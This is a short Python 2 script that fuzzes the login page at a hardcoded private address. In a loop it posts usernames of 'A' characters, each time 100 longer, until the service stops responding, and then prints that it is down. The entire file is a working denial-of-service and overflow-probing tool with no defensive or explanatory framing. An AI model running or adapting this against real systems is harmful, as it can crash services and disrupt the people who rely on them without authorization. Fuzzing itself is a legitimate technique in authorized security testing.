#!/usr/bin/env python

import requests
import time
import sys

session = requests.session()
user_payload = 100
user ='A'
password= 'admin'
Target_Url = "http://10.195.100.11/login/"
try:
    while True :			
	data={
	'username': '{}'.format(user*user_payload),
	'password':'{}'.format(password),
	'user-agent':'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'
	}
	response = session.post(Target_Url,data=data,timeout=3)
	user_payload +=100
	time.sleep(1)
	print 'Fuzzing ********|', user_payload 
	sys.stdout.write('\x1b[1A')
	sys.stdout.write('\x1b[2K')    
except Exception :
        print "Fuzzing stopt at length ",user_payload
	print 'service is down.....'
	exit()
	
        

